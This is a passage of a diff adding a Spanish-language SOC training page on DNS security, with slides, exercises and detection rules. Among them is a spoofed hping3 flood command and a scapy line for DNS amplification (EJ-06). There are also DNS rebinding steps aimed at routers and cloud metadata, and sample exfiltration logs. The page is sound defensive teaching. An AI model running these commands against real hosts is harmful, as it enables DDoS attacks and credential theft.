+  DNS query: evil-rebind.com → 192.168.1.1 (router interno!)
+  Navegador: "evil-rebind.com sigue siendo el mismo dominio"
+  → Same-Origin Policy satisfecha
+
+FASE 3 — JavaScript hace fetch al "mismo dominio":
+  fetch("http://evil-rebind.com/admin")
+  → Navegador resuelve: 192.168.1.1/admin (router interno)
+  → Respuesta enviada al servidor del atacante
+
+OBJETIVOS COMUNES:
+  192.168.1.1          → Panel admin del router (cambiar DNS)
+  10.0.0.x:8080        → APIs internas sin autenticación
+  169.254.169.254      → AWS/GCP/Azure metadata (tokens IAM)
+  localhost:6379       → Redis sin auth → RCE
+
+DETECCIÓN:
+  DNS: TTL < 5 segundos en dominios externos → sospechoso
+  Proxy: peticiones HTTP a IPs RFC1918 desde el navegador
+  EDR: proceso browser conectando a 169.254.169.254
+
+MITIGACIÓN:
+  DNS rebind protection en routers (bloquear RFC1918 en DNS externo)
+  Bind a localhost solo — no exponer servicios internos a 0.0.0.0
+  Cabecera Host validation en APIs internas</pre>
+          <p style="font-size:0.85rem;color:var(--text-secondary);">MITRE ATT&CK: <strong>T1557</strong> — Adversary-in-the-Middle · <strong>T1090.001</strong> — Proxy: Internal</p>
+        </div>
+
+
+      </div><!-- /slides-container -->
+      <div class="slides-nav">
+        <button class="btn btn-secondary btn-prev" disabled data-i18n="btn.prev">← Anterior</button>
+        <div class="slides-progress"></div>
+        <button class="btn btn-primary btn-next" data-i18n="btn.next">Siguiente →</button>
+      </div>
+    </div><!-- /tab teoria -->
+
+    <!-- ── Tab: Ejercicios ── -->
+    <div class="tab-content" data-tab="ejercicios">
+      <div class="ejercicios-list">
+
+        <div class="ejercicio-card">
+          <div class="ejercicio-header">
+            <span class="ejercicio-number">EJ-01</span>
+            <span class="ejercicio-title" data-i18n="dns.ej1.title">¿Qué hace un resolver recursivo?</span>
+            <span class="ejercicio-difficulty dif-easy" data-i18n="ej.easy">Fácil</span>
+          </div>
+          <div class="ejercicio-body">
+            <p data-i18n="dns.ej1.q">Explica con tus palabras qué ocurre cuando escribís <code>bank.com</code> en el browser y tu sistema operativo no tiene la respuesta en caché local. Describí todos los actores involucrados y en qué orden participan.</p>
+            <button class="respuesta-toggle" data-i18n="btn.showAnswer">🔍 Ver respuesta</button>
+            <div class="respuesta-box" data-i18n="dns.ej1.ans">
+1. El SO consulta su caché local → no está.
+2. Envía consulta UDP/53 al resolver configurado (ej: 8.8.8.8).
+3. El resolver consulta un Root Server (13 grupos en todo el mundo).
+4. El Root responde: "pregunta al TLD .com".
+5. El resolver consulta el TLD .com → responde: "pregunta al NS de bank.com".
+6. El resolver consulta el NS autoritativo de bank.com.
+7. Recibe respuesta con la IP y TTL → la guarda en caché.
+8. Retorna la IP al cliente.
+            </div>
+          </div>
+        </div>
+
+        <div class="ejercicio-card">
+          <div class="ejercicio-header">
+            <span class="ejercicio-number">EJ-02</span>
+            <span class="ejercicio-title" data-i18n="dns.ej2.title">Registros DNS para SOC</span>
+            <span class="ejercicio-difficulty dif-easy" data-i18n="ej.easy">Fácil</span>
+          </div>
+          <div class="ejercicio-body">
+            <p data-i18n="dns.ej2.q">Un analista encontró en un incidente que el malware hace consultas de tipo <strong>TXT</strong> repetitivas a <code>c2domain.net</code>. ¿Por qué usaría TXT y no A? ¿Qué ventaja le da al atacante?</p>
+            <button class="respuesta-toggle" data-i18n="btn.showAnswer">🔍 Ver respuesta</button>
+            <div class="respuesta-box" data-i18n="dns.ej2.ans">
+Los registros TXT permiten datos arbitrarios de hasta 255 bytes por string.
+El atacante usa TXT para:
+- Recibir comandos del C2 (el malware lee el TXT y lo interpreta como instrucción)
+- Exfiltrar datos más largos que los subdominios permiten
+- Pasar desapercibido: TXT es común en SPF, DKIM, verificaciones Google/AWS
+
+Ventaja adicional: muchos firewalls permiten todo tráfico DNS (port 53 UDP)
+sin inspección profunda de contenido.
+            </div>
+          </div>
+        </div>
+
+        <div class="ejercicio-card">
+          <div class="ejercicio-header">
+            <span class="ejercicio-number">EJ-03</span>
+            <span class="ejercicio-title" data-i18n="dns.ej3.title">Análisis de log — Identifica el ataque</span>
+            <span class="ejercicio-difficulty dif-medium" data-i18n="ej.medium">Medio</span>
+          </div>
+          <div class="ejercicio-body">
+            <p data-i18n="dns.ej3.q">Analizá el siguiente extracto del <code>dns.log</code> de Zeek y respondé: ¿qué tipo de ataque/actividad sospechosa ves? ¿Qué IOCs identificás?</p>
+            <pre>
+ts=10:23:41  query=VGhpcyBpcyBzZWNyZXQ.exfil.attackerdomain.xyz  qtype=TXT  rcode=NOERROR
+ts=10:23:42  query=IGRhdGEgZm9yIHRlc3Q.exfil.attackerdomain.xyz  qtype=TXT  rcode=NOERROR
+ts=10:23:43  query=aW5nIHB1cnBvc2Vz.exfil.attackerdomain.xyz     qtype=TXT  rcode=NOERROR
+ts=10:23:44  query=dGhpcyBpcyBub3Q.exfil.attackerdomain.xyz      qtype=TXT  rcode=NOERROR
+ts=10:23:45  query=IHJlYWwgZGF0YQ.exfil.attackerdomain.xyz       qtype=TXT  rcode=NOERROR</pre>
+            <button class="respuesta-toggle" data-i18n="btn.showAnswer">🔍 Ver respuesta</button>
+            <div class="respuesta-box" data-i18n="dns.ej3.ans">
+ATAQUE: DNS Tunneling (exfiltración de datos vía DNS TXT)
+
+IOCs identificados:
+1. Subdominios con alta entropía en Base64 (VGhpcyBpcyBzZWNyZXQ, etc.)
+   → decodificados: "This is secret", " data for test", "ing purposes", etc.
+2. Consultas repetitivas al mismo dominio base (exfil.attackerdomain.xyz)
+3. Tipo de consulta TXT (inusual en tráfico legítimo de usuario)
+4. Frecuencia alta: 5 consultas en 4 segundos
+5. Dominio "attackerdomain.xyz" no es un dominio legítimo conocido
+
+Acción recomendada: bloquear *.attackerdomain.xyz en el resolver,
+alertar en SIEM, iniciar investigación del host origen.
+            </div>
+          </div>
+        </div>
+
+        <div class="ejercicio-card">
+          <div class="ejercicio-header">
+            <span class="ejercicio-number">EJ-04</span>
+            <span class="ejercicio-title" data-i18n="dns.ej4.title">DGA — Análisis de entropía</span>
+            <span class="ejercicio-difficulty dif-medium" data-i18n="ej.medium">Medio</span>
+          </div>
+          <div class="ejercicio-body">
+            <p data-i18n="dns.ej4.q">Tenés estos dominios en logs de DNS con <code>rcode=NXDOMAIN</code>. ¿Cuáles son probablemente generados por un DGA? Justificá tu respuesta.</p>
+            <pre>
+google.com         → NOERROR
+xk3mq7pzralc.com  → NXDOMAIN
+microsoft.com      → NOERROR
+9bv2nwtqfeld.com   → NXDOMAIN
+update.adobe.com   → NOERROR
+p4r8kzwqmxjt.com  → NXDOMAIN
+cdn.cloudflare.com → NOERROR
+mq7vbnx2plfc.com  → NXDOMAIN</pre>
+            <button class="respuesta-toggle" data-i18n="btn.showAnswer">🔍 Ver respuesta</button>
+            <div class="respuesta-box" data-i18n="dns.ej4.ans">
+DGA sospechosos: xk3mq7pzralc, 9bv2nwtqfeld, p4r8kzwqmxjt, mq7vbnx2plfc
+
+Justificación:
+1. Alta entropía: mezcla aleatoria de consonantes y números sin significado
+2. Longitud uniforme: 12 caracteres — patrón típico de DGA
+3. Todos retornan NXDOMAIN: el malware está "intentando" conectar con el C2
+   buscando el dominio activo de hoy
+4. Patrón temporal: si son del mismo host en corto tiempo, es DGA definitivo
+
+Los dominios legítimos tienen palabras reconocibles, subdominios coherentes
+con la empresa, y raramente retornan NXDOMAIN de forma masiva.
+            </div>
+          </div>
+        </div>
+
+        <div class="ejercicio-card">
+          <div class="ejercicio-header">
+            <span class="ejercicio-number">EJ-05</span>
+            <span class="ejercicio-title" data-i18n="dns.ej5.title">Escribí una regla de detección</span>
+            <span class="ejercicio-difficulty dif-hard" data-i18n="ej.hard">Difícil</span>
+          </div>
+          <div class="ejercicio-body">
+            <p data-i18n="dns.ej5.q">Escribí una regla Suricata (en pseudocódigo o formato real) para detectar DNS Tunneling basándote en estas señales: consultas TXT a subdominios con más de 40 caracteres antes del primer punto.</p>
+            <button class="respuesta-toggle" data-i18n="btn.showAnswer">🔍 Ver respuesta</button>
+            <div class="respuesta-box" data-i18n="dns.ej5.ans">
+# Regla Suricata — DNS Tunneling via TXT records
+alert dns any any -> any 53 (
+  msg:"ET DNS Tunneling - Long TXT query subdomain";
+  dns.query;
+  pcre:"/^[a-zA-Z0-9+\/=]{40,}\.[a-z0-9\-]+\.[a-z]{2,}$/";
+  dns.type:16;   # tipo TXT
+  threshold: type both, track by_src, count 3, seconds 60;
+  classtype:trojan-activity;
+  sid:9000002; rev:1;
+)
+
+# Alternativa Sigma (SIEM)
+title: DNS Tunneling via TXT - Long Subdomain
+detection:
+  selection:
+    dns.question.type: 'TXT'
+    dns.question.name|re: '^[a-zA-Z0-9+/=]{40,}\.'
+  condition: selection
+level: high
+            </div>
+          </div>
+        </div>
+
+        <!-- Mini Challenge -->
+        <div class="mini-challenge">
+          <div class="challenge-label" data-i18n="ej.challenge">🚨 Mini-Challenge · Resolver el incidente</div>
+          <h3 data-i18n="dns.challenge.title">Incidente #DNS-001: "El empleado que exfiltraba datos sin saberlo"</h3>
+          <p style="color:var(--text-secondary);font-size:0.9rem;margin-bottom:1rem;" data-i18n="dns.challenge.ctx">
+            Recibiste una alerta de tu SIEM a las 3:47 AM. Un host interno (<code>192.168.10.45</code>) generó 847 consultas DNS en 15 minutos, todas a subdominios de <code>updates-service.info</code>. El firewall no bloqueó nada porque el puerto 53 UDP está permitido. No hay alertas de AV.
+          </p>
+          <pre style="font-size:0.78rem;margin-bottom:1rem;">
+[03:47:12] 192.168.10.45 → DNS query: aGVsbG8.updates-service.info TXT NOERROR
+[03:47:13] 192.168.10.45 → DNS query: d29ybGQ.updates-service.info TXT NOERROR
+[03:47:14] 192.168.10.45 → DNS query: dGhpcyBpcw.updates-service.info TXT NOERROR
+... (847 consultas similares en 15 min)
+[04:02:09] 192.168.10.45 → DNS query: health.updates-service.info A NOERROR → 45.33.32.156</pre>
+
+          <div class="ejercicio-card" style="border-color:var(--proto-color);margin-top:0;">
+            <div class="ejercicio-header">
+              <span class="ejercicio-number">CHALLENGE</span>
+              <span class="ejercicio-title" data-i18n="dns.challenge.q">¿Qué pasó? ¿Qué hacés ahora?</span>
+              <span class="ejercicio-difficulty dif-hard" data-i18n="ej.hard">Difícil</span>
+            </div>
+            <div class="ejercicio-body">
+              <p data-i18n="dns.challenge.ask">Respondé: (1) ¿Qué ataque/técnica identificás? (2) ¿Cuál es el primer paso de respuesta? (3) ¿Cómo determinás qué datos salieron?</p>
+              <button class="respuesta-toggle" data-i18n="btn.showAnswer">🔍 Ver análisis completo</button>
+              <div class="respuesta-box" data-i18n="dns.challenge.ans">
+(1) TÉCNICA: DNS Tunneling para exfiltración de datos (T1048.001 - MITRE ATT&CK)
+    - Subdominios Base64 codificados → datos exfiltrados
+    - 847 consultas TXT en 15 min = ~12KB de datos (estimado)
+    - IP final (45.33.32.156) = servidor C2 de Metasploit conocido
+
+(2) RESPUESTA INMEDIATA:
+    → Aislar 192.168.10.45 de la red (o bloquear DNS externo del host)
+    → Bloquear *.updates-service.info en el resolver DNS
+    → Escalar a Tier 2 / IR team
+    → Preservar logs de Zeek y tráfico del host (no apagar aún)
+
+(3) ANÁLISIS DE DATOS EXFILTRADOS:
+    → Extraer todos los subdominios del log DNS para ese host
+    → Decodificar Base64 de cada subdominio
+    → Concatenar en orden cronológico
+    → aGVsbG8 = "hello", d29ybGQ = "world" → "hello world this is..."
+    → Determinar qué archivos/datos tenía acceso el usuario en esa máquina
+
+NOTA: si el empleado no era consciente, puede ser malware instalado en su equipo
+sin su conocimiento. Revisar procesos activos, startup items, scheduled tasks.
+              </div>
+            </div>
+          </div>
+        </div>
+
+
+        <div class="ejercicio-card">
+          <div class="ejercicio-header">
+            <span class="ejercicio-number">EJ-06</span>
+            <span class="ejercicio-title" data-i18n="dns.ej6.title">DNS Amplification: calcula el factor de amplificación</span>
+            <span class="ejercicio-difficulty dif-medium" data-i18n="ej.medium">Medio</span>
+          </div>
+          <div class="ejercicio-body">
+            <p data-i18n="dns.ej6.q">Un atacante envía queries DNS tipo ANY con IP origen spoofed (la víctima). Cada query pesa 40 bytes. Los resolvers abiertos responden con 4.000 bytes cada uno. El atacante usa 500 resolvers. ¿Cuánto tráfico recibe la víctima por segundo si el atacante dispara 1.000 queries/s? ¿Cuál es el factor de amplificación? ¿Qué comando usaría el atacante con hping3?</p>
+            <button class="respuesta-toggle" data-i18n="btn.showAnswer">🔍 Ver respuesta</button>
+            <div class="respuesta-box" data-i18n="dns.ej6.ans">
+FACTOR: 4.000 / 40 = ×100x de amplificación
+
+TRÁFICO EN VÍCTIMA:
+  500 resolvers × 4.000 bytes × 1.000 queries/s = 2.000.000.000 bytes/s = 2 Gbps
+
+COMANDO (hping3):
+  hping3 --udp --spoof [victim_ip] -p 53 --flood [resolver_ip]
+  O con scapy: send(IP(src="victim",dst="resolver")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qtype="ANY")))
+
+MITIGACIÓN EN EL RESOLVER:
+  - Deshabilitar queries tipo ANY
+  - Implementar Response Rate Limiting (RRL): max-udp-size 512
+  - Bloquear consultas de IPs externas (solo recursión para IPs internas)
+            </div>
+          </div>
+        </div>
+
+        <div class="ejercicio-card">
+          <div class="ejercicio-header">
+            <span class="ejercicio-number">EJ-07</span>
+            <span class="ejercicio-title" data-i18n="dns.ej7.title">DNS Rebinding: ¿por qué el navegador confía?</span>
+            <span class="ejercicio-difficulty dif-hard" data-i18n="ej.hard">Difícil</span>
+          </div>
+          <div class="ejercicio-body">
+            <p data-i18n="dns.ej7.q">Explicá paso a paso cómo el DNS Rebinding viola la Same-Origin Policy del navegador. ¿Qué condición es necesaria para que el ataque funcione (TTL)? ¿Qué recursos internos podría obtener un atacante que controla un dominio con TTL=1s? ¿Cómo se puede mitigar desde el lado del resolver DNS?</p>
+            <button class="respuesta-toggle" data-i18n="btn.showAnswer">🔍 Ver respuesta</button>
+            <div class="respuesta-box" data-i18n="dns.ej7.ans">
+POR QUÉ FUNCIONA:
+1. El navegador implementa Same-Origin Policy por (protocolo, dominio, puerto)
+2. El atacante controla evil.com con TTL=1s
+3. Primera resolución: evil.com → 1.2.3.4 (IP pública real del atacante)
+4. El usuario visita evil.com — carga JS malicioso
+5. TTL expira (1 segundo), el atacante cambia en su servidor DNS: evil.com → 192.168.1.1
+6. El JS hace fetch("http://evil.com/admin") — el navegador resuelve evil.com de nuevo
+7. Ahora evil.com → 192.168.1.1 (router del usuario)
+8. La petición llega al router — SOP no se viola porque el dominio es el mismo (evil.com)
+9. La respuesta del router llega al JS del atacante
+
+CONDICIÓN NECESARIA: TTL muy bajo (≤1s) + JavaScript activo en el navegador
+
+RECURSOS EN RIESGO:
+  - Router admin (192.168.1.1) → cambiar DNS de toda la red
+  - AWS metadata (169.254.169.254) → robo de credenciales IAM
+  - APIs internas (10.x.x.x) → exfiltración de datos corporativos
+
+MITIGACIONES:
+  - DNS rebind protection en el resolver (pi-hole, unbound): rechaza respuestas con IPs RFC1918
+  - No exponer servicios internos en 0.0.0.0 sin auth
+  - HTTPS + validación de certificado (no ayuda si usamos HTTP interno)
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </div><!-- /tab ejercicios -->
+
+    <!-- ── Tab: Recursos ── -->
+    <div class="tab-content" data-tab="recursos">
+
+      <div class="section-title" data-i18n="rec.official">📄 Documentación Oficial</div>
+      <div class="recursos-grid mb-3">
+        <div class="recurso-card">
+          <div class="recurso-type">RFC</div>
+          <h4>RFC 1034 / 1035 — DNS</h4>
+          <p data-i18n="dns.rec.rfc1035">Especificación original del sistema DNS. Define la estructura del protocolo, tipos de registros y comportamiento del resolver.</p>
+          <a class="recurso-link" href="https://www.rfc-editor.org/rfc/rfc1035" target="_blank" rel="noopener">→ rfc-editor.org/rfc/rfc1035</a>
+        </div>
+        <div class="recurso-card">
+          <div class="recurso-type">RFC</div>
+          <h4>RFC 4033 / 4034 / 4035 — DNSSEC</h4>
+          <p data-i18n="dns.rec.rfc4033">Extensiones de seguridad para DNS. Firma criptográfica de registros para prevenir spoofing y envenenamiento de caché.</p>
+          <a class="recurso-link" href="https://www.rfc-editor.org/rfc/rfc4033" target="_blank" rel="noopener">→ rfc-editor.org/rfc/rfc4033</a>
+        </div>
+      </div>
+
+      <div class="section-title" data-i18n="rec.tools">🛠️ Herramientas SOC</div>
+      <div class="recursos-grid mb-3">
+        <div class="recurso-card">
+          <div class="recurso-type" data-i18n="rec.type.tool.cli">Herramienta · CLI</div>
+          <h4>dig — DNS lookup</h4>
+          <p data-i18n="dns.rec.dig">Herramienta estándar para consultas DNS manuales. Muestra el proceso completo de resolución.</p>
+          <pre style="font-size:0.78rem;margin-top:0.5rem;">dig example.com A
+dig +trace example.com
+dig -x 93.184.216.34   # reverse DNS
+dig example.com TXT</pre>
+        </div>
+        <div class="recurso-card">
+          <div class="recurso-type" data-i18n="rec.type.tool.pcap">Herramienta · PCAP</div>
+          <h4 data-i18n="rec.h.wireshark">Wireshark — filtros DNS</h4>
+          <p data-i18n="dns.rec.wireshark">Análisis de tráfico DNS en capturas de red.</p>
+          <pre style="font-size:0.78rem;margin-top:0.5rem;">dns                        # all DNS
+dns.flags.response == 0    # queries only
+dns.qry.name contains "evil"
+dns.resp.len > 512         # large responses</pre>
+        </div>
+        <div class="recurso-card">
+          <div class="recurso-type" data-i18n="rec.type.tool.nsm">Herramienta · NSM</div>
+          <h4>Zeek — dns.log</h4>
+          <p data-i18n="dns.rec.zeek">Network Security Monitor. Genera logs estructurados de todo el tráfico DNS.</p>
+          <pre style="font-size:0.78rem;margin-top:0.5rem;">cat dns.log | zeek-cut ts query qtype_name answers
+# Filter massive NXDOMAIN (possible DGA):
+cat dns.log | zeek-cut rcode_name query \
+  | awk '$1=="NXDOMAIN"' | sort | uniq -c | sort -rn | head</pre>
+        </div>
+        <div class="recurso-card">
+          <div class="recurso-type" data-i18n="rec.type.tool.online">Herramienta · Online</div>
+          <h4>MXToolbox — DNS Lookup</h4>
+          <p data-i18n="dns.rec.mxtoolbox">Verificación online de registros DNS, blacklists y diagnóstico de configuración.</p>
+          <a class="recurso-link" href="https://mxtoolbox.com/SuperTool.aspx" target="_blank" rel="noopener">→ mxtoolbox.com/SuperTool</a>
+        </div>
+      </div>
+
+      <div class="section-title" data-i18n="rec.cves">⚡ CVEs y Vulnerabilidades Relevantes</div>
+      <div class="recursos-grid mb-3">
+        <div class="recurso-card">
+          <div class="recurso-type" data-i18n="rec.type.cve.crit">CVE · Crítico</div>
+          <h4>CVE-2008-1447 — Kaminsky Attack</h4>
+          <p data-i18n="dns.rec.kaminsky">Vulnerabilidad en la aleatoriedad del puerto origen de consultas DNS. Permitió ataques de cache poisoning prácticos. Parchado con source port randomization.</p>
+        </div>
+        <div class="recurso-card">
+          <div class="recurso-type" data-i18n="rec.type.cve.crit">CVE · Crítico</div>
+          <h4>CVE-2020-1350 — SIGRed</h4>
+          <p data-i18n="dns.rec.sigred">Buffer overflow en Windows DNS Server. CVSS 10.0. Permite RCE sin autenticación via respuesta DNS maliciosa.</p>
+          <a class="recurso-link" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-1350" target="_blank" rel="noopener">→ MSRC Advisory</a>
+        </div>
+        <div class="recurso-card">
+          <div class="recurso-type" data-i18n="rec.type.cve.crit">CVE · Crítico</div>
+          <h4>CVE-2018-1000115 — Memcached Amplification</h4>
+          <p data-i18n="dns.rec.memcached">Memcached expuesto en UDP permitió el ataque DDoS de 1.7 Tbps contra GitHub (2018). Factor ×51,000x. Solución: deshabilitar UDP con -U 0.</p>
+          <a class="recurso-link" href="https://nvd.nist.gov/vuln/detail/CVE-2018-1000115" target="_blank" rel="noopener">→ NVD CVE-2018-1000115</a>
+        </div>
+        <div class="recurso-card">
+          <div class="recurso-type" data-i18n="rec.type.research">Investigación</div>
+          <h4>DNS Rebinding — Stanford Research</h4>
+          <p data-i18n="dns.rec.rebinding">Trabajo original de Collin Jackson (Stanford) que popularizó el ataque DNS Rebinding y demostró acceso a routers y APIs internas.</p>
+          <a class="recurso-link" href="https://crypto.stanford.edu/dns/" target="_blank" rel="noopener">→ crypto.stanford.edu/dns</a>
+        </div>
+      </div>
+
+      <div class="section-title" data-i18n="rec.cheatsheet">📋 Cheatsheet DNS para SOC</div>
+      <div class="cheatsheet-table-wrap">
+        <table class="cheatsheet-table">
+          <thead>
+            <tr>
+              <th data-i18n="dns.cheat.signal">Señal</th>
+              <th data-i18n="dns.cheat.cause">Posible causa</th>
+              <th data-i18n="dns.cheat.action">Acción</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr><td data-i18n="dns.cheat.r1.sig">NXDOMAIN masivo desde un host</td><td data-i18n="dns.cheat.r1.cau">DGA, reconocimiento</td><td data-i18n="dns.cheat.r1.act">Correlacionar con intel, aislar si persiste</td></tr>
+            <tr><td data-i18n="dns.cheat.r2.sig">Subdominio Base64/hex largo</td><td data-i18n="dns.cheat.r2.cau">DNS Tunneling, C2</td><td data-i18n="dns.cheat.r2.act">Decodificar, bloquear dominio base, investigar host</td></tr>
+            <tr><td data-i18n="dns.cheat.r3.sig">Consultas TXT repetitivas</td><td data-i18n="dns.cheat.r3.cau">Tunneling, recepción de comandos C2</td><td data-i18n="dns.cheat.r3.act">Bloquear en resolver, capturar tráfico completo</td></tr>
+            <tr><td data-i18n="dns.cheat.r4.sig">TTL muy bajo (&lt;60s) con IP cambiante</td><td data-i18n="dns.cheat.r4.cau">Fast Flux, C2 evasivo</td><td data-i18n="dns.cheat.r4.act">Registrar IPs históricas, reportar dominio</td></tr>
+            <tr><td data-i18n="dns.cheat.r5.sig">Respuesta con IP en rango inesperado</td><td data-i18n="dns.cheat.r5.cau">Cache Poisoning</td><td data-i18n="dns.cheat.r5.act">Verificar con servidor autoritativo directo</td></tr>
+            <tr><td data-i18n="dns.cheat.r6.sig">Consultas a .onion, .bit, .i2p</td><td data-i18n="dns.cheat.r6.cau">Malware, TOR, darknet</td><td data-i18n="dns.cheat.r6.act">Bloquear en resolver, alertar IR</td></tr>
+            <tr><td data-i18n="dns.cheat.r7.sig">Volumen DNS desde servidor interno</td><td data-i18n="dns.cheat.r7.cau">Tunneling o reconocimiento interno</td><td data-i18n="dns.cheat.r7.act">Revisar qué proceso genera las consultas</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="section-title mt-3" data-i18n="rec.labs">🎯 Labs Externos Recomendados</div>
+      <div class="recursos-grid">
+        <div class="recurso-card">
+          <div class="recurso-type">TryHackMe</div>
+          <h4>DNS in Detail</h4>
+          <p data-i18n="dns.rec.thm">Introducción práctica al protocolo DNS y sus registros.</p>
+          <a class="recurso-link" href="https://tryhackme.com/room/dnsindetail" target="_blank" rel="noopener">→ tryhackme.com/room/dnsindetail</a>
+        </div>
+        <div class="recurso-card">
+          <div class="recurso-type">MITRE ATT&amp;CK</div>
+          <h4>T1071.004 — DNS C2</h4>
+          <p data-i18n="dns.rec.t1071">Técnica de Command and Control via DNS. Incluye ejemplos de grupos APT que la usan.</p>
+          <a class="recurso-link" href="https://attack.mitre.org/techniques/T1071/004/" target="_blank" rel="noopener">→ attack.mitre.org/T1071/004</a>
+        </div>
+        <div class="recurso-card">
+          <div class="recurso-type">MITRE ATT&amp;CK</div>
+          <h4 data-i18n="dns.rec.h.t1048">T1048.001 — Exfiltración DNS</h4>
+          <p data-i18n="dns.rec.t1048">Exfiltración de datos sobre protocolos alternativos — DNS como canal encubierto.</p>
+          <a class="recurso-link" href="https://attack.mitre.org/techniques/T1048/001/" target="_blank" rel="noopener">→ attack.mitre.org/T1048/001</a>
+        </div>
+        <div class="recurso-card">
+          <div class="recurso-type">MITRE ATT&amp;CK</div>
+          <h4>T1498.002 — Reflection Amplification</h4>
+          <p data-i18n="dns.rec.t1498">Ataques de amplificación por reflexión incluyendo DNS, NTP, Memcached y SSDP. Descripción de técnicas y mitigaciones.</p>
+          <a class="recurso-link" href="https://attack.mitre.org/techniques/T1498/002/" target="_blank" rel="noopener">→ attack.mitre.org/T1498/002</a>
+        </div>
+        <div class="recurso-card">
+          <div class="recurso-type">Cloudflare</div>
+          <h4>DNS Amplification DDoS Attack</h4>
+          <p data-i18n="dns.rec.cf.amp">Explicación técnica de Cloudflare sobre DNS Amplification DDoS con ejemplos de tráfico real.</p>
+          <a class="recurso-link" href="https://www.cloudflare.com/learning/ddos/dns-amplification-ddos-attack/" target="_blank" rel="noopener">→ cloudflare.com/learning/ddos/dns-amplification</a>
+        </div>
+      </div>
+
+    </div><!-- /tab recursos -->
+
+  </main>
+
+  <footer class="site-footer">
+    <div class="container">
+      <div class="footer-links">
+        <a href="../index.html" data-i18n="dns.footer.prev">← Hub Principal</a>
+        <a href="../http/index.html" data-i18n="dns.footer.next">HTTP/HTTPS →</a>
+      </div>
+      <p data-i18n="footer.license">@xavimape · Uso educativo y defensivo · MIT License</p>
+    </div>
+  </footer>
+
+  <script src="../theme-switcher.js"></script>
+  <script src="../i18n-core.js"></script>
+  <script src="../i18n-dns.js"></script>
+  <script src="../shared.js"></script>
+  <script src="app.js"></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      SOC.initSlides('dns-slides');
+      SOC.initEjercicios();
+      SOC.saveProgress('dns', 'demo');
+    });
+  </script>
+</body>
+</html>
